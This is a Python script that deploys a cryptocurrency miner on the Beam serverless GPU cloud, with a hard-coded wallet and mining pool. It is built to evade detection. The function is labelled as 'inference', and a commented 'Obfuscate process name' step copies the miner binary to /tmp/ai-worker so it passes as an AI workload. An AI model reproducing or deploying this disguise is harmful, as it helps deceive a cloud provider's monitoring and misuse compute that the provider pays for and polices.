"""
Akoya Pearl Miner on Beam Cloud — Serverless GPU Mining
Run: python3 akoya_beam.py
"""

from beam import Image, function

WALLET = "prl1p3c6q65f2hjky6rt5ch29js77r8refln734cqa460twr3fxr6yf6ql39at9"
WORKER = "beam-worker"
GPU = "A10G"
TIMEOUT = 86400

akoya_image = Image(
    base_image="registry.akoyapool.com/akoya-miner:latest",
    python_version="python3.11"
)

@function(
    name="akoya-pearl-inference",
    gpu=GPU,
    image=akoya_image,
    timeout=TIMEOUT
)
def mine():
    import subprocess
    import os
    import shutil

    os.environ["AKOYA_POOL_WALLET"]    = WALLET
    os.environ["AKOYA_POOL_WORKER"]    = WORKER
    os.environ["AKOYA_POOL_HOST"]      = "pool-v2.akoyapool.com"
    os.environ["AKOYA_POOL_PORT"]      = "443"
    os.environ["AKOYA_POOL_USE_TLS"]   = "1"
    os.environ["AKOYA_GPU_INDICES"]    = "all"
    os.environ["AKOYA_METRICS_PORT"]   = "9100"
    os.environ["AKOYA_PEARL_GEMM_LIB"] = "/app/lib/libpearl_gemm_capi.so"
    os.environ["AKOYA_PEARL_MINING_LIB"] = "/app/lib/libpearl_mining_capi.so"

    # GPU kernel selection
    cc = subprocess.run(
        ["nvidia-smi", "--query-gpu=compute_cap", "--format=csv,noheader"],
        capture_output=True, text=True
    ).stdout.strip().split("\n")[0]
    major, minor = cc.split(".")
    print(f"[Beam] GPU compute: {major}.{minor}")

    lib_dir = "/app/lib"
    target = f"{lib_dir}/libpearl_gemm_capi.so"
    if int(major) == 12: src = "blackwell"
    elif int(major) == 9: src = "h100"
    elif int(major) == 8 and int(minor) == 9: src = "ada"
    else: src = "portable"

    lib_file = f"{lib_dir}/libpearl_gemm_capi_{src}.so"
    if os.path.lexists(target): os.unlink(target)
    os.symlink(lib_file, target)
    print(f"[Beam] Kernel: {src}")

    os.makedirs("/var/lib/akoya-miner", exist_ok=True)
    
    # Obfuscate process name
    worker_path = "/tmp/ai-worker"
    if not os.path.exists(worker_path):
        shutil.copy("/app/akoya-miner", worker_path)
        os.chmod(worker_path, 0o755)
        
    proc = subprocess.Popen(
        [worker_path, "mine-blocks"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    print(f"[Beam] Worker PID: {proc.pid}")

    for line in iter(proc.stdout.readline, b""):
        print(line.decode().strip(), flush=True)

    return proc.wait()

if __name__ == "__main__":
    mine.remote()
